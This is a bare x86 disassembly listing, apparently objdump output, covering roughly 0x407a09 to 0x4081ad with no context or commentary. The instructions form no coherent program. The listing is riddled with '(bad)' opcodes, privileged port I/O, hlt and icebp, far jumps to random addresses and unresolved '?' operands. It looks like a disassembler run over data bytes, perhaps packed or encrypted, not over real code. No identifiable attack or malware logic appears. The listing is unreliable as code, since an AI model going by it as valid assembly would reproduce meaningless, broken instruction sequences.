  407a09:	cmp    DWORD PTR [esi-0x47c4290f],0x48
  407a10:	inc    esp
  407a11:	cmp    bl,cl
  407a13:	(bad)  
  407a14:	std    
  407a15:	out    dx,eax
  407a16:	mov    esp,0xa677664a
  407a1b:	xchg   DWORD PTR [esi+0x70],ebx
  407a1e:	iret   
  407a1f:	ret    
  407a20:	pop    ebp
  407a21:	aad    0xa0
  407a23:	repnz mov ah,0xf1
  407a26:	dec    esi
  407a27:	and    al,ah
  407a29:	test   eax,0xa55c4688
  407a2e:	arpl   WORD PTR [ecx+0x295d4cc0],bx
  407a34:	inc    esp
  407a35:	or     BYTE PTR [edi-0x58fbe462],0xef
  407a3c:	cmp    eax,0x26d07978
  407a41:	pop    ds
  407a42:	push   eax
  407a43:	arpl   WORD PTR [ebp+0x31],bp
  407a46:	sbb    DWORD PTR [eax+0xeeb7296],0x3a
  407a4d:	(bad)  
  407a4e:	sti    
  407a4f:	ret    
  407a50:	fmul   DWORD PTR [ecx-0x6a]
  407a53:	mov    ds:0xb6a96833,eax
  407a58:	fdivr  st,st(2)
  407a5a:	or     al,0x58
  407a5c:	cld    
  407a5d:	retf   
  407a5e:	inc    ebp
  407a5f:	mov    eax,ds:0xece88e11
  407a64:	outs   dx,DWORD PTR ds:[esi]
  407a65:	push   edi
  407a66:	rcl    DWORD PTR [edi],1
  407a68:	add    al,0x7f
  407a6a:	xor    al,0x9
  407a6c:	add    ah,BYTE PTR [ecx+0x11]
  407a6f:	cmovbe ebp,DWORD PTR [esi-0x23460fc9]
  407a76:	adc    ebp,DWORD PTR [ebx+0x5a]
  407a79:	(bad)  
  407a7a:	(bad)  
  407a7b:	das    
  407a7c:	stos   DWORD PTR es:[edi],eax
  407a7d:	mov    esi,0xdef5f887
  407a82:	ret    
  407a83:	jg     0x407a5a
  407a85:	mov    ebp,0x311efc41
  407a8a:	mov    ecx,0xb69982a1
  407a8f:	pop    ss
  407a90:	and    ch,ch
  407a92:	fisttp QWORD PTR [esi+0x31]
  407a95:	jp     0x407b0c
  407a97:	arpl   dx,cx
  407a99:	adc    eax,0x452aaaf0
  407a9e:	push   eax
  407a9f:	jp     0x407ac4
  407aa1:	hlt    
  407aa2:	cmp    BYTE PTR [edi],al
  407aa4:	clc    
  407aa5:	pop    es
  407aa6:	mov    eax,0x10cc2c8e
  407aab:	cmp    DWORD PTR [eax-0x2a],ebp
  407aae:	ds inc esp
  407ab0:	(bad)  
  407ab1:	ja     0x407aac
  407ab3:	pusha  
  407ab4:	fnsave [ebp+0x78]
  407ab7:	dec    ebp
  407ab8:	push   ds
  407ab9:	ins    DWORD PTR es:[edi],dx
  407aba:	add    al,BYTE PTR ss:[esi+0x748fbee6]
  407ac1:	ins    BYTE PTR es:[edi],dx
  407ac2:	fadd   DWORD PTR [ecx-0x6c477922]
  407ac8:	aaa    
  407ac9:	ja     0x407a70
  407acb:	cs and eax,0x3758ba67
  407ad1:	loopne 0x407ab3
  407ad3:	mov    eax,0x194763
  407ad8:	add    DWORD PTR [ecx-0x3c5bc205],esp
  407ade:	pop    esp
  407adf:	(bad)  
  407ae0:	cmp    edi,edx
  407ae2:	add    al,0x41
  407ae4:	cli    
  407ae5:	das    
  407ae6:	lock in eax,0xff
  407ae9:	sbb    BYTE PTR [edi],dh
  407aeb:	je     0x407aea
  407aed:	cmp    DWORD PTR [edx],esp
  407aef:	jbe    0x407b22
  407af1:	add    dh,ah
  407af3:	mov    esp,0x8c4d8daa
  407af8:	cmp    DWORD PTR [ecx],edx
  407afa:	jbe    0x407aab
  407afc:	jge    0x407b60
  407afe:	inc    ecx
  407aff:	cmp    eax,0x22a996e9
  407b04:	arpl   WORD PTR [eax],dx
  407b06:	mov    ds:0x4ca85098,eax
  407b0b:	jp     0x407ab2
  407b0d:	gs xor ch,cl
  407b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b11:	mov    edi,0xcce782c0
  407b16:	outs   dx,DWORD PTR ds:[esi]
  407b17:	mov    esp,esi
  407b19:	and    eax,0x67b2e7ce
  407b1e:	jns    0x407ab9
  407b20:	sti    
  407b21:	push   eax
  407b22:	fs es mov al,0x88
  407b26:	ror    DWORD PTR [ebp-0x65],cl
  407b29:	jbe    0x407af8
  407b2b:	xlat   BYTE PTR ds:[ebx]
  407b2c:	pushf  
  407b2d:	aad    0x7b
  407b2f:	pop    edx
  407b30:	inc    ebx
  407b31:	ss adc al,0x92
  407b34:	fmul   st,st(0)
  407b36:	jne    0x407b3e
  407b38:	dec    esi
  407b39:	or     eax,0x38421569
  407b3e:	adc    al,0xcb
  407b40:	mov    ah,0xdd
  407b42:	cmp    ebp,DWORD PTR [edx+0x4a517792]
  407b48:	jecxz  0x407ba5
  407b4a:	add    esi,edi
  407b4c:	test   BYTE PTR [ebx-0x4af1c262],cl
  407b52:	pop    ss
  407b53:	fdiv   st,st(3)
  407b55:	outs   dx,DWORD PTR ds:[esi]
  407b56:	stc    
  407b57:	xor    BYTE PTR [esi-0x8197626],bl
  407b5d:	aas    
  407b5e:	test   eax,0x9dbf5107
  407b63:	sub    ebp,eax
  407b65:	aam    0xc3
  407b67:	in     al,0x12
  407b69:	xor    DWORD PTR [ebp+0x68],0x717da84c
  407b70:	sub    ebp,DWORD PTR [edi-0x3]
  407b73:	jg     0x407b5c
  407b75:	pop    edi
  407b76:	or     DWORD PTR [eax-0x4220aad0],ebx
  407b7c:	inc    edi
  407b7d:	add    ah,BYTE PTR [ebp+0x5]
  407b80:	push   ebp
  407b81:	add    al,0xd5
  407b83:	pusha  
  407b84:	leave  
  407b85:	cmp    eax,0x8756dd94
  407b8a:	dec    ecx
  407b8b:	test   eax,0xc0f61b8c
  407b90:	lea    edx,[edx-0x457f625d]
  407b96:	push   ds
  407b97:	pop    esp
  407b98:	and    eax,0x6048ce8f
  407b9d:	push   edi
  407b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b9f:	das    
  407ba0:	mov    bh,0xaf
  407ba2:	js     0x407b35
  407ba4:	and    cl,BYTE PTR [edx+0x4a]
  407ba7:	(bad)  
  407ba8:	iret   
  407ba9:	stos   DWORD PTR es:[edi],eax
  407baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bab:	int3   
  407bac:	aam    0x5d
  407bae:	push   ebp
  407baf:	leave  
  407bb0:	and    al,0xaa
  407bb2:	arpl   WORD PTR gs:[edi],bx
  407bb5:	mov    ah,0x54
  407bb7:	add    eax,DWORD PTR [edx]
  407bb9:	ds push 0xb5dbfdff
  407bbf:	shl    BYTE PTR [edx+ecx*4],0xbd
  407bc3:	test   DWORD PTR ds:0x1f52dd87,eax
  407bc9:	jbe    0x407b94
  407bcb:	adc    BYTE PTR [edi],0x1e
  407bce:	lods   al,BYTE PTR ds:[esi]
  407bcf:	aaa    
  407bd0:	xlat   BYTE PTR gs:[ebx]
  407bd2:	sbb    eax,0xec35606d
  407bd7:	pop    edi
  407bd8:	jo     0x407b5f
  407bda:	ja     0x407b7e
  407bdc:	das    
  407bdd:	push   ax
  407bdf:	sti    
  407be0:	adc    esi,DWORD PTR [edx]
  407be2:	cmp    eax,0x52db3619
  407be7:	pop    eax
  407be8:	loopne 0x407c0f
  407bea:	mul    DWORD PTR [ebp+0x7c3550c7]
  407bf0:	imul   ecx,edx,0xffffffd4
  407bf3:	jns    0x407b7d
  407bf5:	dec    ecx
  407bf6:	aam    0xc
  407bf8:	inc    edx
  407bf9:	and    eax,0x36e8a3ee
  407bfe:	aad    0x45
  407c00:	aaa    
  407c01:	dec    esp
  407c02:	loopne 0x407bfd
  407c04:	push   0x2b
  407c06:	add    bl,dl
  407c08:	sbb    eax,0x7917fec6
  407c0d:	cwde   
  407c0e:	push   edx
  407c0f:	mov    bh,0xeb
  407c11:	loope  0x407bbe
  407c13:	repz lahf 
  407c15:	cld    
  407c16:	mov    ah,0x66
  407c18:	jb     0x407c50
  407c1a:	data16 aad 0x91
  407c1d:	hlt    
  407c1e:	and    edi,ecx
  407c20:	popw   ds
  407c22:	pop    ss
  407c23:	sbb    eax,0xaf9f89f3
  407c28:	xlat   BYTE PTR ds:[ebx]
  407c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c2a:	push   cs
  407c2b:	je     0x407c25
  407c2d:	push   0x71a7b481
  407c32:	inc    eax
  407c33:	mov    esp,0x18e11c4
  407c38:	gs push eax
  407c3a:	sbb    ebx,edi
  407c3c:	rcl    DWORD PTR [eax+edx*8+0x42],cl
  407c40:	loope  0x407bf9
  407c42:	loopne 0x407c22
  407c44:	mov    dl,0xcf
  407c46:	sub    al,0x6b
  407c48:	cli    
  407c49:	push   eax
  407c4a:	outs   dx,BYTE PTR ds:[esi]
  407c4b:	dec    ebx
  407c4c:	mov    dl,0x6d
  407c4e:	xlat   BYTE PTR ds:[ebx]
  407c4f:	sbb    al,0x5a
  407c51:	ja     0x407be2
  407c53:	sbb    bh,BYTE PTR [eax+0x40]
  407c56:	cmc    
  407c57:	sar    ah,1
  407c59:	lahf   
  407c5a:	mov    al,ds:0x1be9fad6
  407c5f:	ror    BYTE PTR [ebp-0x85b4fe0],0xa4
  407c66:	call   0x638172af
  407c6b:	leave  
  407c6c:	sub    DWORD PTR [edi],0x9d3a0354
  407c72:	dec    edx
  407c73:	cmovnp edx,ebp
  407c76:	ret    0xcd13
  407c79:	fnstcw WORD PTR [ebx-0x40]
  407c7c:	sbb    al,0xfd
  407c7e:	jle    0x407c19
  407c80:	std    
  407c81:	pop    esp
  407c82:	mov    WORD PTR [ebp+edx*4+0x1e],?
  407c86:	or     eax,0xad786a2
  407c8b:	and    al,BYTE PTR [ebp+0x6d]
  407c8e:	loope  0x407c37
  407c90:	adc    eax,0x22e349eb
  407c95:	cs lahf 
  407c97:	(bad)  
  407c98:	adc    ah,BYTE PTR [ebx-0x78]
  407c9b:	dec    ebx
  407c9c:	mov    edi,0xa53030e
  407ca1:	pop    ecx
  407ca2:	sbb    ebp,DWORD PTR ds:0x795175b6
  407ca8:	pop    ebx
  407ca9:	lea    esi,[ebx]
  407cab:	jnp    0x407ce7
  407cad:	cmp    al,0x2f
  407caf:	jge    0x407cf3
  407cb1:	scas   al,BYTE PTR es:[edi]
  407cb2:	arpl   WORD PTR [edi-0x10],ax
  407cb5:	outs   dx,DWORD PTR ds:[esi]
  407cb6:	lahf   
  407cb7:	mov    ds,WORD PTR [eax-0x26]
  407cba:	sub    DWORD PTR [ebx+0x2debe27c],edx
  407cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cc1:	shr    BYTE PTR [edi+edx*8-0x7038f70e],1
  407cc8:	or     DWORD PTR [edi],ecx
  407cca:	imul   edx,DWORD PTR [eax-0x3],0x7ef4ddfe
  407cd1:	dec    eax
  407cd2:	mov    BYTE PTR [edi+0x30],0xe6
  407cd6:	icebp  
  407cd7:	sbb    eax,0x44e4c6f6
  407cdc:	add    al,0x72
  407cde:	mov    cl,0xb7
  407ce0:	push   eax
  407ce1:	loop   0x407c86
  407ce3:	int3   
  407ce4:	loope  0x407d14
  407ce6:	or     eax,0x3ceaf5b4
  407ceb:	sbb    eax,0xc61e58ee
  407cf0:	dec    ebp
  407cf1:	sbb    BYTE PTR [esp+eiz*8-0x41697bc9],dl
  407cf8:	or     BYTE PTR [ebp-0x63eaf329],bh
  407cfe:	push   edi
  407cff:	fucomip st,st(3)
  407d01:	int3   
  407d02:	mov    ecx,0xf1d1018
  407d07:	nop
  407d08:	div    DWORD PTR [ebx+0x17]
  407d0b:	push   ecx
  407d0c:	jmp    0x71a4e56a
  407d11:	push   0xdb6eb51
  407d16:	shl    BYTE PTR [ebp+eiz*1-0x39],0x63
  407d1b:	push   cs
  407d1c:	mov    eax,ds:0xb7f5532b
  407d21:	pop    edi
  407d22:	xchg   edx,eax
  407d23:	inc    ebx
  407d24:	lods   eax,DWORD PTR ds:[esi]
  407d25:	push   esi
  407d26:	jb     0x407d36
  407d28:	or     dh,dh
  407d2a:	mov    bl,0xbd
  407d2c:	cdq    
  407d2d:	call   0x46c5edf4
  407d32:	jne    0x407ced
  407d34:	mov    eax,ds:0x178cc5a3
  407d39:	push   eax
  407d3a:	ja     0x407d93
  407d3c:	sar    DWORD PTR [ebx*4+0x656b541],1
  407d43:	dec    edi
  407d44:	xor    eax,0x2e643738
  407d49:	mov    esi,0xeb498b4
  407d4e:	sub    ebp,ecx
  407d50:	bound  ebp,QWORD PTR [edi-0x11]
  407d53:	push   ebx
  407d54:	push   ebx
  407d55:	ret    
  407d56:	push   ebp
  407d57:	cwde   
  407d58:	cmp    bl,BYTE PTR [edi+0xeb68095]
  407d5e:	xchg   ecx,eax
  407d5f:	pop    ds
  407d60:	imul   esi
  407d62:	adc    ecx,ecx
  407d64:	es push ss
  407d66:	daa    
  407d67:	and    al,0xf6
  407d69:	push   ds
  407d6a:	sar    al,cl
  407d6c:	dec    edi
  407d6d:	push   ecx
  407d6e:	lahf   
  407d6f:	or     eax,0x36ce489d
  407d74:	shl    BYTE PTR [eax],1
  407d76:	sar    DWORD PTR [eax-0x19cb3ed9],cl
  407d7c:	cmc    
  407d7d:	cs fwait
  407d7f:	call   0x197d:0xd3be32c2
  407d86:	mov    gs,WORD PTR [ecx]
  407d88:	sbb    BYTE PTR [ecx-0xb],ah
  407d8b:	dec    ebx
  407d8c:	sar    DWORD PTR [ecx-0x442c5c2d],cl
  407d92:	shl    DWORD PTR ds:0xb4dc4de8,1
  407d98:	push   ecx
  407d99:	jp     0x407db6
  407d9b:	inc    ecx
  407d9c:	ret    
  407d9d:	shr    BYTE PTR [edx],1
  407d9f:	ss sub eax,0xa5af6ff4
  407da5:	es sbb eax,0xf2f0202f
  407dab:	pusha  
  407dac:	neg    BYTE PTR [edi+0x39]
  407daf:	js     0x407d73
  407db1:	fld    TBYTE PTR [edi+0x27177ddd]
  407db7:	cwde   
  407db8:	addr16 in eax,dx
  407dba:	sub    edx,esi
  407dbc:	loope  0x407dfe
  407dbe:	xor    al,0x16
  407dc0:	xchg   dh,ch
  407dc2:	dec    esi
  407dc3:	cld    
  407dc4:	jecxz  0x407de2
  407dc6:	scas   eax,DWORD PTR es:[edi]
  407dc7:	(bad)  
  407dc8:	or     bl,BYTE PTR ds:0xc0205e28
  407dce:	add    DWORD PTR ds:0xde876105,esp
  407dd4:	hlt    
  407dd5:	push   edi
  407dd6:	int3   
  407dd7:	cwde   
  407dd8:	and    al,0x96
  407dda:	ins    BYTE PTR es:[edi],dx
  407ddb:	sahf   
  407ddc:	jge    0x407d62
  407dde:	jnp    0x407e20
  407de0:	dec    ebp
  407de1:	xor    eax,0x90c2c313
  407de6:	loop   0x407e21
  407de8:	mov    edx,0xaafeec6
  407ded:	sbb    al,0x44
  407def:	test   esp,esp
  407df1:	cmc    
  407df2:	stos   BYTE PTR es:[edi],al
  407df3:	sub    eax,0xafe9f59
  407df8:	rol    DWORD PTR [edi+0x13],0xc2
  407dfc:	aaa    
  407dfd:	pushf  
  407dfe:	fistp  QWORD PTR ds:[edi]
  407e01:	mov    ebp,DWORD PTR [esi-0x4d]
  407e04:	outs   dx,BYTE PTR ds:[esi]
  407e05:	xchg   edi,eax
  407e06:	pop    ebp
  407e07:	xchg   ebp,eax
  407e08:	popa   
  407e09:	xchg   esi,eax
  407e0a:	jecxz  0x407e43
  407e0c:	jge    0x407db4
  407e0e:	add    BYTE PTR [ecx],bh
  407e10:	mov    edx,0x2c4afcd7
  407e15:	(bad)  
  407e16:	clc    
  407e17:	xchg   edx,eax
  407e18:	xchg   ebx,eax
  407e19:	xor    bl,ah
  407e1b:	sbb    al,0x18
  407e1d:	cmp    ebx,ecx
  407e1f:	jb     0x407da8
  407e21:	push   edx
  407e23:	adc    esp,DWORD PTR [ebp+edx*8-0x25]
  407e27:	outs   dx,DWORD PTR ds:[esi]
  407e28:	ret    0xe171
  407e2b:	xchg   DWORD PTR [ebp-0x403a9355],esp
  407e31:	or     cl,dh
  407e33:	mov    ah,0xcd
  407e35:	cdq    
  407e36:	pop    eax
  407e37:	push   ecx
  407e38:	icebp  
  407e39:	dec    BYTE PTR [edx]
  407e3b:	lea    ebx,[ecx+0x65dff191]
  407e41:	fs ins DWORD PTR es:[edi],dx
  407e43:	cmp    eax,ebx
  407e45:	loopne 0x407df7
  407e47:	mov    ah,0x8f
  407e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e4a:	cli    
  407e4b:	shl    DWORD PTR [edi-0x36e53e3f],cl
  407e51:	test   BYTE PTR [edi-0x3a],dl
  407e54:	pusha  
  407e55:	or     ah,ah
  407e57:	mov    eax,0xb5ac42e5
  407e5c:	jge    0x407ed1
  407e5e:	adc    DWORD PTR [eax-0x68],ebx
  407e61:	clc    
  407e62:	mov    ah,0x35
  407e64:	fisub  DWORD PTR [edx]
  407e66:	lahf   
  407e67:	jno    0x407ebe
  407e69:	outs   dx,BYTE PTR es:[esi]
  407e6b:	int    0x8b
  407e6d:	cli    
  407e6e:	adc    al,0x5c
  407e70:	sti    
  407e71:	dec    esp
  407e72:	enter  0xe104,0x5f
  407e76:	cdq    
  407e77:	add    al,0x54
  407e79:	jp     0x407eb1
  407e7b:	pop    ds
  407e7c:	lahf   
  407e7d:	(bad)  
  407e7e:	pop    edx
  407e7f:	ins    BYTE PTR es:[edi],dx
  407e80:	mov    eax,0xa0fc8803
  407e85:	push   edi
  407e86:	(bad)  
  407e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e89:	fcomp  DWORD PTR [edi]
  407e8b:	stc    
  407e8c:	lods   al,BYTE PTR ds:[esi]
  407e8d:	aas    
  407e8e:	mov    ecx,0x5baa2593
  407e93:	pop    esp
  407e94:	jg     0x407e36
  407e96:	dec    esp
  407e97:	fs call 0x116e:0x1e5d7c42
  407e9f:	call   0xa2ce3225
  407ea4:	aad    0x60
  407ea6:	mov    ch,0x7b
  407ea8:	cmp    BYTE PTR [edx],al
  407eaa:	xor    BYTE PTR [ebx+0x77577cea],ch
  407eb0:	xor    eax,DWORD PTR ds:0xbf93e314
  407eb6:	loope  0x407ee7
  407eb8:	ss adc eax,0xb046d0d6
  407ebe:	ins    BYTE PTR es:[edi],dx
  407ebf:	cdq    
  407ec0:	fistp  DWORD PTR [esi]
  407ec2:	pop    ds
  407ec3:	cmp    eax,0xc2d78c5e
  407ec8:	xor    ch,BYTE PTR [ecx+0x4cab2669]
  407ece:	and    eax,0x654ac01
  407ed3:	fisub  DWORD PTR [esi-0x20]
  407ed6:	mov    esi,0x34ecff06
  407edb:	inc    ebx
  407edc:	lods   eax,DWORD PTR ds:[esi]
  407edd:	pop    edx
  407ede:	adc    ecx,DWORD PTR [eax-0x32d479e6]
  407ee4:	sbb    bl,BYTE PTR [ebp-0x69]
  407ee7:	mov    edx,0xb56892f
  407eec:	aad    0x2b
  407eee:	hlt    
  407eef:	lock jl 0x407ed6
  407ef2:	or     al,0x34
  407ef4:	adc    edx,ebx
  407ef6:	xor    ebx,DWORD PTR ds:0xe8f31e47
  407efc:	pop    ecx
  407efd:	fsubr  st(2),st
  407eff:	or     DWORD PTR [ecx-0x5b],edi
  407f02:	ss xchg esi,eax
  407f04:	mov    ebx,0x6039adad
  407f09:	jecxz  0x407f2d
  407f0b:	mov    bl,BYTE PTR ds:0x22f6b45e
  407f11:	into   
  407f12:	hlt    
  407f13:	push   es
  407f14:	push   0x6332ed50
  407f19:	adc    ebx,DWORD PTR [ecx]
  407f1b:	push   esi
  407f1c:	dec    eax
  407f1d:	push   edx
  407f1e:	je     0x407f88
  407f20:	or     ebx,0xffffffd8
  407f23:	dec    edx
  407f24:	mov    BYTE PTR [eax-0x33],bl
  407f27:	sbb    cl,BYTE PTR [edx+edi*2]
  407f2a:	xor    al,0xbd
  407f2c:	stos   BYTE PTR es:[edi],al
  407f2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f2e:	inc    ecx
  407f2f:	dec    eax
  407f30:	jg     0x407f7a
  407f32:	mov    ds:0xa85a7cca,eax
  407f37:	and    BYTE PTR [ebx+0x54],0x6e
  407f3b:	sbb    al,0xe3
  407f3d:	data16 sbb al,0x62
  407f40:	pop    edi
  407f41:	ret    0x96ee
  407f44:	imul   eax,DWORD PTR [eax],0xffffff88
  407f47:	ret    
  407f48:	out    dx,al
  407f49:	outs   dx,BYTE PTR ds:[esi]
  407f4a:	jnp    0x407ed3
  407f4c:	pop    edx
  407f4d:	cmp    edx,DWORD PTR [esi-0x7b6010f]
  407f53:	and    bh,bh
  407f55:	mov    al,ds:0x74848a1b
  407f5a:	dec    edi
  407f5b:	addr16 pop esi
  407f5d:	(bad)  
  407f5e:	inc    ebp
  407f5f:	push   ss
  407f60:	mov    ebp,0xa55f87d8
  407f65:	cli    
  407f66:	fcom   DWORD PTR [ebx]
  407f68:	xor    eax,0x16e25416
  407f6d:	pop    ebp
  407f6e:	(bad)  [ebx+0x5cfaacba]
  407f74:	popf   
  407f75:	ret    0x805
  407f78:	pusha  
  407f79:	out    dx,eax
  407f7a:	scas   al,BYTE PTR es:[edi]
  407f7b:	or     al,0x27
  407f7d:	mov    BYTE PTR [eax+0x76],dl
  407f80:	mov    ah,0xf8
  407f82:	xlat   BYTE PTR ds:[ebx]
  407f83:	pop    es
  407f84:	push   esi
  407f85:	sub    esp,eax
  407f87:	retf   
  407f88:	dec    edi
  407f89:	push   eax
  407f8a:	push   es
  407f8b:	xor    eax,0x1032ed26
  407f90:	jecxz  0x407f80
  407f92:	iret   
  407f93:	mov    ecx,0x7dcf8bbe
  407f98:	adc    BYTE PTR [edi-0x6b72f1f9],cl
  407f9e:	fwait
  407f9f:	bound  ecx,QWORD PTR [edi+0x6fe6c113]
  407fa5:	sub    eax,0x7275b6e7
  407faa:	sbb    DWORD PTR [esi],ebx
  407fac:	(bad)  
  407fad:	aam    0xb5
  407faf:	pop    ebp
  407fb0:	sahf   
  407fb1:	sbb    ebx,DWORD PTR [ebx+0xb]
  407fb4:	outs   dx,BYTE PTR ds:[esi]
  407fb5:	arpl   WORD PTR [eax+0x3f],ax
  407fb8:	push   ecx
  407fb9:	mov    bl,0x57
  407fbb:	xor    ecx,DWORD PTR [ecx]
  407fbd:	mov    al,0x37
  407fbf:	cmp    al,0x35
  407fc1:	out    dx,eax
  407fc2:	(bad)  
  407fc3:	xor    DWORD PTR [esi],edx
  407fc5:	out    0xdc,eax
  407fc7:	jne    0x407f4a
  407fc9:	mov    ds:0x4fc6b198,al
  407fce:	mov    ds:0x7ebb8a42,eax
  407fd3:	and    edi,DWORD PTR [eax-0xa]
  407fd6:	aad    0x87
  407fd8:	cmp    DWORD PTR [ebx+0x620a94d],0x5c
  407fdf:	(bad)  
  407fe0:	mov    edi,0x9196ab9f
  407fe5:	xor    edx,DWORD PTR [bx]
  407fe8:	add    BYTE PTR [esp+ecx*4],dl
  407feb:	adc    ch,bl
  407fed:	lock jmp 0xa2f9:0x9bdde8e
  407ff5:	sbb    DWORD PTR [edx+0x32],esp
  407ff8:	cmp    eax,0xc577b580
  407ffd:	lock out 0x8,al
  408000:	ss loop 0x40805d
  408003:	adc    esi,DWORD PTR [eax-0x17]
  408006:	sbb    cl,BYTE PTR [edi+0x73]
  408009:	mov    eax,0x5384fa30
  40800e:	cmp    DWORD PTR ds:0x48115b47,edi
  408014:	ja     0x407fde
  408016:	call   0xec650e0f
  40801b:	dec    ecx
  40801c:	aad    0xf5
  40801e:	shl    ebx,1
  408020:	pop    eax
  408021:	jns    0x408014
  408023:	inc    eax
  408024:	jo     0x40807f
  408026:	lods   al,BYTE PTR ds:[esi]
  408027:	push   esp
  408028:	daa    
  408029:	int3   
  40802a:	stos   BYTE PTR es:[edi],al
  40802b:	xor    dl,BYTE PTR [ecx+0x7ff2ebf1]
  408031:	jg     0x408005
  408033:	push   cs
  408034:	pop    eax
  408035:	inc    esp
  408036:	sahf   
  408037:	xor    cl,BYTE PTR [ebx+0x56]
  40803a:	pop    ds
  40803b:	hlt    
  40803c:	push   0x1397a582
  408041:	xor    ch,dh
  408043:	fldenv [edi-0x1e06553c]
  408049:	das    
  40804a:	xchg   esi,eax
  40804b:	rcl    BYTE PTR [ecx-0x8],1
  40804e:	push   es
  40804f:	pushf  
  408050:	repnz push ebp
  408052:	pop    edx
  408053:	ins    BYTE PTR es:[edi],dx
  408054:	jmp    0x40808c
  408056:	dec    ebp
  408057:	or     al,0x1b
  408059:	jb     0x40809e
  40805b:	outs   dx,DWORD PTR ds:[esi]
  40805c:	xor    BYTE PTR [ebx],bl
  40805e:	and    al,0x99
  408060:	cmp    eax,0xc18fe4a8
  408065:	test   BYTE PTR [eax-0x6e],ah
  408068:	cwde   
  408069:	popf   
  40806a:	xchg   edi,eax
  40806b:	sub    ebx,DWORD PTR [edi-0x166852dc]
  408071:	pop    ebx
  408072:	and    ecx,DWORD PTR [eax]
  408074:	sub    BYTE PTR [ebp-0x19],ch
  408077:	outs   dx,BYTE PTR ds:[esi]
  408078:	add    DWORD PTR [eax],ebx
  40807a:	ja     0x4080a6
  40807c:	mov    ecx,0xaa4fc1ef
  408081:	mov    bh,0xaa
  408083:	cmc    
  408084:	mov    edi,gs
  408086:	(bad)  
  408087:	sub    al,0x72
  408089:	sub    al,0xfc
  40808b:	pop    edi
  40808c:	gs sbb al,0x70
  40808f:	pusha  
  408090:	xchg   ebx,eax
  408091:	aam    0x64
  408093:	in     al,dx
  408094:	in     al,dx
  408095:	adc    eax,0xd140a7fc
  40809a:	jl     0x4080ae
  40809c:	mov    al,BYTE PTR [edx-0x51]
  40809f:	pop    esi
  4080a0:	push   ebx
  4080a1:	cmp    al,0x31
  4080a3:	cmp    esi,DWORD PTR [edx+0x1d]
  4080a6:	scas   al,BYTE PTR es:[edi]
  4080a7:	inc    DWORD PTR [edx+0x19]
  4080aa:	sbb    al,0xad
  4080ac:	jl     0x408082
  4080ae:	pop    esi
  4080af:	push   ebp
  4080b0:	fdiv   DWORD PTR [ecx]
  4080b2:	cmp    cl,BYTE PTR [eax-0x7233f5dc]
  4080b8:	(bad)  
  4080b9:	not    BYTE PTR [esi+0x13]
  4080bc:	add    BYTE PTR [edi-0x33],bh
  4080bf:	aad    0xa3
  4080c1:	or     eax,0x91a0dfb3
  4080c6:	mov    al,ds:0x4b0d8ae6
  4080cb:	pop    ebx
  4080cc:	pop    esi
  4080cd:	or     BYTE PTR [edx-0xc32e45b],dl
  4080d3:	push   edi
  4080d4:	mov    bl,0xf
  4080d6:	adc    eax,0x1ee140c
  4080db:	sbb    DWORD PTR [eax],edx
  4080dd:	test   eax,0x92550cc5
  4080e2:	mov    ah,0xeb
  4080e4:	mov    ah,0x7
  4080e6:	xor    BYTE PTR [edi+0x75593d9c],bl
  4080ec:	jns    0x4080b5
  4080ee:	mov    eax,0x20109d81
  4080f3:	inc    ebx
  4080f4:	imul   ebx,DWORD PTR [edx-0x28eb7da6],0xc7110a24
  4080fe:	or     edx,ecx
  408100:	fsub   QWORD PTR [ecx]
  408102:	loopne 0x40812e
  408104:	push   ebp
  408105:	fs pop ecx
  408107:	sar    BYTE PTR [edx+0x75],1
  40810a:	inc    esi
  40810b:	(bad)  
  40810c:	xlat   BYTE PTR ds:[ebx]
  40810d:	xchg   ebx,eax
  40810e:	(bad)  
  40810f:	cmp    eax,DWORD PTR [ecx+0xc]
  408112:	mov    ?,WORD PTR [eax]
  408114:	lods   al,BYTE PTR ds:[esi]
  408115:	out    dx,al
  408116:	mov    esi,0x989df572
  40811b:	cli    
  40811c:	rcl    BYTE PTR [ebx+0x5d],cl
  40811f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408120:	das    
  408121:	icebp  
  408122:	rcr    DWORD PTR [eax+0x3],0x25
  408126:	les    esp,FWORD PTR [esi+ebx*8]
  408129:	call   0xdad9:0xe2cfd91d
  408130:	icebp  
  408131:	pop    es
  408132:	pop    ds
  408133:	fabs   
  408135:	dec    al
  408137:	test   al,0x5
  408139:	aam    0xde
  40813b:	and    eax,0xc925396a
  408140:	push   es
  408141:	stos   BYTE PTR es:[edi],al
  408142:	es jl  0x4080e3
  408145:	xchg   edi,eax
  408146:	ficomp WORD PTR [edi+0x45f785ae]
  40814c:	inc    edi
  40814d:	xchg   esp,eax
  40814e:	jecxz  0x40811f
  408150:	or     DWORD PTR [ecx+0x72],eax
  408153:	pop    ebp
  408154:	jmp    0xc864e957
  408159:	addr16 xchg ecx,eax
  40815b:	jo     0x408102
  40815d:	dec    edx
  40815e:	xchg   esi,eax
  40815f:	mov    BYTE PTR [ebp-0x7b],ah
  408162:	xchg   ebp,eax
  408163:	sti    
  408164:	xor    BYTE PTR [edi+0x52],bh
  408167:	adc    al,0xdd
  408169:	dec    esp
  40816a:	pushf  
  40816b:	and    DWORD PTR [esi-0x6f04e3ab],0x6df361a2
  408175:	pop    eax
  408176:	int3   
  408177:	xor    DWORD PTR [ecx+0x68],esp
  40817a:	adc    al,BYTE PTR [ebx+edi*4+0x3a]
  40817e:	fiadd  DWORD PTR [esi]
  408180:	push   0xffffffd6
  408182:	push   eax
  408183:	es js  0x40812a
  408186:	sbb    eax,DWORD PTR ds:0xbdb0545c
  40818c:	jg     0x4081fb
  40818e:	data16 in al,0x80
  408191:	inc    eax
  408192:	ins    DWORD PTR es:[edi],dx
  408193:	(bad)  
  408194:	(bad)  [esi-0x20844822]
  40819a:	retf   
  40819b:	push   ss
  40819c:	and    eax,0x1f34324d
  4081a1:	push   edx
  4081a2:	mov    WORD PTR [ebx+eax*4],fs
  4081a5:	sbb    al,0xbf
  4081a7:	ins    DWORD PTR es:[edi],dx
  4081a8:	bound  edi,QWORD PTR [ebp+0x1a]
  4081ab:	sub    al,BYTE PTR [eax]
  4081ad:	cld    
